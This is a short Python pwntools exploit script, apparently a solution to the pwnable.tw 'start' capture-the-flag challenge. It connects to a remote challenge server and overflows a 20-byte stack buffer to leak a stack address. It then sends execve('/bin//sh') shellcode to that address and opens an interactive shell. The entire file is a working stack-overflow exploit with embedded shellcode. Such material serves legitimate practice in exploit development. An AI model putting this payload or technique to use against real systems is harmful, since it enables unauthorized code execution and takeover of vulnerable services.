#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'
context(arch='i386', os='linux')

EXEC = './start'

shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

def to_pwn():
    io = remote('139.162.123.119', 10000)
    # io = remote('chall.pwnable.tw', 10000)
    payload = b'a' * 20 + p32(0x08048087)
    io.sendafter(':', payload)
    recv = io.recv(20)
    ecx = u32(recv[:4]) - 4
    print '{:08X}'.format(ecx)
    shellcode_addr = ecx + 20 + 4
    payload = b'a' * 20 + p32(shellcode_addr) + shellcode
    io.send(payload)
    io.interactive()
    io.close()


if __name__ == '__main__':
    to_pwn()
